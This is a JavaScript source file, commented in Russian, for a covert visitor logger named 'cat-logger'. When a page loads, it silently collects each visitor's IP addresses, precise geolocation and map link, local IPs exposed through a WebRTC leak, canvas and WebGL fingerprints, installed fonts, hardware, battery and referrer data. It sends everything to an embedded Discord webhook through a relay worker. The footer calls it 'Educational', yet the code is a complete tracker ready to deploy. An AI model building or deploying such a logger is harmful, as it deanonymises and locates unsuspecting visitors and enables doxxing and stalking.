// ==================================================
// НАСТРОЙКИ
// ==================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1568934373611413606/CrpWp7F7muDIhsSkcxFJ2qWD8dclJ-MfuN2oj626Iz49oBTZUP8Tn2MD0eJb0UQQOwRb";
const WORKER_URL  = "https://wispy-bar-366f.afdsafdsaf32.workers.dev";
// ==================================================

// ---------- Утилиты ----------
async function safeFetch(url, opts = {}, timeout = 4000) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeout);
    try {
        const r = await fetch(url, { ...opts, signal: ctrl.signal });
        clearTimeout(t);
        if (!r.ok) return null;
        return await r.json();
    } catch {
        clearTimeout(t);
        return null;
    }
}

// ---------- IP ----------
async function getIPv4() {
    const d = await safeFetch("https://api.ipify.org?format=json");
    return d?.ip || null;
}
async function getIPv6() {
    const d = await safeFetch("https://api6.ipify.org?format=json");
    return d?.ip || null;
}

// ---------- Гео ----------
async function getGeo(ip) {
    // Основной источник
    let d = await safeFetch("https://ipapi.co/json/");
    if (d && d.ip) return normalizeGeo(d, "ipapi.co");

    // Запасной
    d = await safeFetch("https://ipwho.is/");
    if (d && d.ip) return normalizeGeo2(d);

    // Третий
    d = await safeFetch("https://ipinfo.io/json");
    if (d && d.ip) return normalizeGeo3(d);

    return {};
}

function normalizeGeo(d, src) {
    return {
        source: src,
        ip: d.ip,
        city: d.city,
        region: d.region,
        country: d.country_name,
        countryCode: d.country_code,
        postal: d.postal,
        latitude: d.latitude,
        longitude: d.longitude,
        timezone: d.timezone,
        utcOffset: d.utc_offset,
        org: d.org,
        asn: d.asn,
        continent: d.continent_code,
        currency: d.currency,
        callingCode: d.country_calling_code,
        inEU: d.in_eu,
    };
}
function normalizeGeo2(d) {
    return {
        source: "ipwho.is",
        ip: d.ip,
        city: d.city,
        region: d.region,
        country: d.country,
        countryCode: d.country_code,
        postal: d.postal,
        latitude: d.latitude,
        longitude: d.longitude,
        timezone: d.timezone?.id,
        utcOffset: d.timezone?.utc,
        org: d.connection?.org,
        asn: d.connection?.asn,
        continent: d.continent,
        currency: d.currency?.code,
        callingCode: d.calling_code,
        inEU: d.is_eu,
    };
}
function normalizeGeo3(d) {
    const [lat, lon] = (d.loc || "").split(",");
    return {
        source: "ipinfo.io",
        ip: d.ip,
        city: d.city,
        region: d.region,
        country: d.country,
        countryCode: d.country,
        postal: d.postal,
        latitude: lat,
        longitude: lon,
        timezone: d.timezone,
        utcOffset: null,
        org: d.org,
        asn: d.org?.split(" ")[0],
        continent: null,
        currency: null,
        callingCode: null,
        inEU: null,
    };
}

// ---------- Браузер и железо ----------
async function getBattery() {
    if (!navigator.getBattery) return "N/A";
    try {
        const b = await navigator.getBattery();
        return `${Math.round(b.level * 100)}% ${b.charging ? "(заряжается)" : ""}`;
    } catch { return "N/A"; }
}

function getConnection() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return "N/A";
    return {
        type: c.effectiveType || "?",
        downlink: c.downlink || "?",
        rtt: c.rtt || "?",
        saveData: c.saveData || false,
    };
}

function getGPU() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return "N/A";
        const info = gl.getExtension("WEBGL_debug_renderer_info");
        if (!info) return "N/A";
        return {
            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL),
            version: gl.getParameter(gl.VERSION),
        };
    } catch { return "N/A"; }
}

function getCanvasFingerprint() {
    try {
        const c = document.createElement("canvas");
        c.width = 200; c.height = 40;
        const ctx = c.getContext("2d");
        ctx.textBaseline = "top";
        ctx.font = "14px Arial";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("cat-logger 🐱", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("cat-logger 🐱", 4, 17);
        const hash = c.toDataURL().slice(-50);
        return hash;
    } catch { return "N/A"; }
}

function getWebGLFingerprint() {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl");
        if (!gl) return "N/A";
        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
        const data = [
            gl.getParameter(gl.VERSION),
            gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
            gl.getParameter(gl.VENDOR),
            gl.getParameter(gl.RENDERER),
            dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "",
            dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "",
            gl.getParameter(gl.MAX_TEXTURE_SIZE),
            gl.getParameter(gl.MAX_VIEWPORT_DIMS)?.toString(),
            gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
        ].join("|");
        return simpleHash(data);
    } catch { return "N/A"; }
}

function simpleHash(str) {
    let h = 0;
    for (let i = 0; i < str.length; i++) {
        h = ((h << 5) - h + str.charCodeAt(i)) | 0;
    }
    return Math.abs(h).toString(16);
}

function getFonts() {
    const testFonts = [
        "Arial", "Verdana", "Times New Roman", "Courier New", "Georgia",
        "Trebuchet MS", "Comic Sans MS", "Impact", "Tahoma", "Lucida Console",
        "Segoe UI", "Roboto", "Helvetica Neue", "Cantarell", "Ubuntu",
    ];
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const base = "monospace";
    ctx.font = `72px ${base}`;
    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;
    const detected = [];
    for (const f of testFonts) {
        ctx.font = `72px ${f}, ${base}`;
        if (ctx.measureText("mmmmmmmmmmlli").width !== baseWidth) detected.push(f);
    }
    return detected;
}

function getMediaDevices() {
    return {
        audioinput: navigator.mediaDevices ? "API есть" : "нет",
        // Реальное перечисление требует разрешения, поэтому не считаем
    };
}

function getPermissions() {
    if (!navigator.permissions) return "N/A";
    return "API есть";
}

async function getStorageEstimate() {
    if (!navigator.storage?.estimate) return "N/A";
    try {
        const est = await navigator.storage.estimate();
        return `${(est.quota / 1024 / 1024 / 1024).toFixed(2)} GB квота`;
    } catch { return "N/A"; }
}

function getLanguages() {
    return {
        main: navigator.language || "?",
        all: (navigator.languages || []).join(", ") || "?",
        userLanguage: navigator.userLanguage || "?",
    };
}

function getTimezoneInfo() {
    try {
        return {
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset(),
            offsetStr: `UTC${new Date().getTimezoneOffset() > 0 ? "-" : "+"}${Math.abs(new Date().getTimezoneOffset() / 60)}`,
        };
    } catch { return { tz: "?", offset: 0, offsetStr: "?" }; }
}

function getPluginsInfo() {
    // Устарело в современных браузерах, но попробуем
    const p = navigator.plugins;
    if (!p || p.length === 0) return "нет/скрыто";
    return Array.from(p).map(x => x.name).join(", ").slice(0, 200);
}

function getDoNotTrack() {
    return navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || "не задан";
}

function getScreenDetails() {
    return {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type || "?",
        pixelRatio: window.devicePixelRatio || 1,
    };
}

function getWindowDetails() {
    return {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        screenX: window.screenX,
        screenY: window.screenY,
    };
}

function getHardwareInfo() {
    return {
        cores: navigator.hardwareConcurrency || "?",
        memory: navigator.deviceMemory || "N/A",
        maxTouchPoints: navigator.maxTouchPoints || 0,
        platform: navigator.platform,
        vendor: navigator.vendor || "?",
        product: navigator.product || "?",
    };
}

async function getWebRTCLeak() {
    // Пытаемся получить локальные IP через WebRTC (классическая утечка)
    return new Promise(resolve => {
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            const ips = new Set();
            pc.createDataChannel("");
            pc.onicecandidate = e => {
                if (!e.candidate) {
                    pc.close();
                    resolve(Array.from(ips).join(", ") || "не удалось");
                    return;
                }
                const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}|[a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7}/i);
                if (m) ips.add(m[0]);
            };
            pc.createOffer().then(o => pc.setLocalDescription(o));
            setTimeout(() => { try { pc.close(); } catch {} resolve(Array.from(ips).join(", ") || "таймаут"); }, 3000);
        } catch { resolve("недоступно"); }
    });
}

function getReferrerInfo() {
    return {
        referrer: document.referrer || "прямой заход",
        pageUrl: location.href,
        host: location.host,
        protocol: location.protocol,
    };
}

// ---------- Главная функция ----------
async function collectAndSend() {
    try {
        // IP-адреса — параллельно
        const [ipv4, ipv6, geo] = await Promise.all([
            getIPv4(),
            getIPv6(),
            getGeo(),
        ]);

        // Дополнительные асинхронные
        const [battery, storage, webrtc] = await Promise.all([
            getBattery(),
            getStorageEstimate(),
            getWebRTCLeak(),
        ]);

        const data = {
            // IP
            ipv4: ipv4 || "нет",
            ipv6: ipv6 || "нет (или не поддерж.)",
            geoIp: geo.ip || "?",

            // Гео
            geo: geo,

            // Браузер
            userAgent: navigator.userAgent,
            languages: getLanguages(),
            platform: navigator.platform,
            vendor: navigator.vendor,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: getDoNotTrack(),
            online: navigator.onLine,

            // Железо
            hardware: getHardwareInfo(),
            gpu: getGPU(),

            // Экран
            screen: getScreenDetails(),
            window: getWindowDetails(),

            // Время
            timezone: getTimezoneInfo(),
            localTime: new Date().toLocaleString("ru-RU"),

            // Отпечатки
            canvasHash: getCanvasFingerprint(),
            webglHash: getWebGLFingerprint(),
            fonts: getFonts(),

            // Устройство
            battery: battery,
            connection: getConnection(),
            storage: storage,
            touchSupport: "ontouchstart" in window,
            maxTouchPoints: navigator.maxTouchPoints || 0,

            // Утечки
            webrtcLeak: webrtc,

            // Прочее
            plugins: getPluginsInfo(),
            referrerInfo: getReferrerInfo(),
        };

        await sendToDiscord(data);
    } catch (e) {
        console.error("Ошибка сбора:", e);
    }
}

// ---------- Отправка ----------
async function sendToDiscord(d) {
    const g = d.geo || {};
    const coords = (g.latitude && g.longitude) ? `${g.latitude}, ${g.longitude}` : "нет";

    const fields = [
        // ===== IP =====
        { name: "🌐 IPv4", value: `\`${d.ipv4}\``, inline: true },
        { name: "🌐 IPv6", value: `\`${d.ipv6}\``, inline: true },
        { name: "📍 IP для гео", value: `\`${d.geoIp}\` (${g.source || "?"})`, inline: true },

        // ===== Гео =====
        { name: "🌍 Страна", value: `${g.country || "?"} (${g.countryCode || "?"})`, inline: true },
        { name: "🏙️ Город / Регион", value: `${g.city || "?"} / ${g.region || "?"}`, inline: true },
        { name: "📮 Индекс", value: g.postal || "?", inline: true },
        { name: "🧭 Координаты", value: coords, inline: false },
        { name: "🗺️ Карта", value: (g.latitude && g.longitude) ? `[Google Maps](https://www.google.com/maps?q=${g.latitude},${g.longitude})` : "нет", inline: false },
        { name: "🏢 Провайдер", value: g.org || "?", inline: false },
        { name: "🔢 ASN", value: g.asn || "?", inline: true },
        { name: "🌐 Континент", value: g.continent || "?", inline: true },
        { name: "🕐 Часовой пояс", value: `${g.timezone || "?"} (${g.utcOffset || "?"})`, inline: true },
        { name: "🇪🇺 EU", value: g.inEU === null ? "?" : (g.inEU ? "да" : "нет"), inline: true },
        { name: "💰 Валюта", value: g.currency || "?", inline: true },
        { name: "📞 Код страны", value: g.callingCode || "?", inline: true },

        // ===== Время =====
        { name: "🕒 Локальное время", value: d.localTime, inline: true },
        { name: "⏱️ Часовой пояс (браузер)", value: d.timezone.tz, inline: true },
        { name: "⏱️ Смещение", value: d.timezone.offsetStr, inline: true },

        // ===== Железо =====
        { name: "💻 ОС / Платформа", value: d.platform, inline: true },
        { name: "🏷️ Вендор", value: d.vendor || "?", inline: true },
        { name: "⚙️ CPU ядер", value: `${d.hardware.cores}`, inline: true },
        { name: "🧠 RAM", value: `${d.hardware.memory} GB`, inline: true },
        { name: "🖱️ Max touch points", value: `${d.hardware.maxTouchPoints}`, inline: true },
        { name: "📱 Touch", value: d.touchSupport ? "да" : "нет", inline: true },

        // ===== GPU =====
        { name: "🎮 GPU Vendor", value: d.gpu.vendor || "N/A", inline: false },
        { name: "🎮 GPU Renderer", value: d.gpu.renderer || "N/A", inline: false },
        { name: "🎮 WebGL версия", value: d.gpu.version || "N/A", inline: true },
        { name: "🔒 WebGL fingerprint", value: `\`${d.webglHash}\``, inline: true },
        { name: "🎨 Canvas fingerprint", value: `\`${d.canvasHash}\``, inline: true },

        // ===== Экран =====
        { name: "🖥️ Экран", value: `${d.screen.width}x${d.screen.height} (${d.screen.colorDepth}bit)`, inline: true },
        { name: "🖥️ Доступно", value: `${d.screen.availWidth}x${d.screen.availHeight}`, inline: true },
        { name: "🔄 Ориентация", value: d.screen.orientation, inline: true },
        { name: "🔍 Pixel ratio", value: `${d.screen.pixelRatio}`, inline: true },
        { name: "🪟 Окно", value: `${d.window.innerWidth}x${d.window.innerHeight}`, inline: true },
        { name: "🪟 Позиция окна", value: `X:${d.window.screenX}, Y:${d.window.screenY}`, inline: true },

        // ===== Языки =====
        { name: "🌍 Язык", value: d.languages.main, inline: true },
        { name: "🌍 Все языки", value: d.languages.all, inline: false },

        // ===== Устройство =====
        { name: "🔋 Батарея", value: d.battery, inline: true },
        { name: "📶 Сеть", value: `${d.connection.type} / ${d.connection.downlink} Mbps / RTT ${d.connection.rtt}`, inline: false },
        { name: "💾 Хранилище", value: d.storage, inline: true },
        { name: "📡 Online", value: d.online ? "да" : "нет", inline: true },
        { name: "🍪 Cookies", value: d.cookiesEnabled ? "вкл" : "выкл", inline: true },
        { name: "🕵️ Do Not Track", value: d.doNotTrack, inline: true },

        // ===== Утечки =====
        { name: "🚨 WebRTC (локальные IP)", value: `\`${d.webrtcLeak}\``, inline: false },
        { name: "🔤 Шрифты", value: (d.fonts || []).join(", ").slice(0, 500) || "?", inline: false },
        { name: "🧩 Плагины", value: d.plugins.slice(0, 300) || "нет", inline: false },

        // ===== Прочее =====
        { name: "🔗 Referrer", value: d.referrerInfo.referrer, inline: false },
        { name: "📄 Страница", value: d.referrerInfo.pageUrl, inline: false },

        // ===== User-Agent =====
        { name: "🧾 User-Agent", value: "```" + d.userAgent + "```", inline: false },
    ];

    const payload = {
        username: "🐱 Котик-логгер",
        embeds: [{
            title: "Новый посетитель!",
            color: 0x764ba2,
            fields,
            timestamp: new Date().toISOString(),
            footer: { text: "Educational IP Logger • IPv4+IPv6" }
        }]
    };

    const target = `${WORKER_URL}?webhook=${encodeURIComponent(WEBHOOK_URL)}`;

    const r = await fetch(target, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    });

    if (!r.ok) console.error("Worker ответил:", r.status, await r.text());
    else console.log("✅ Отправлено в Discord");
}

window.addEventListener("load", () => setTimeout(collectAndSend, 500));
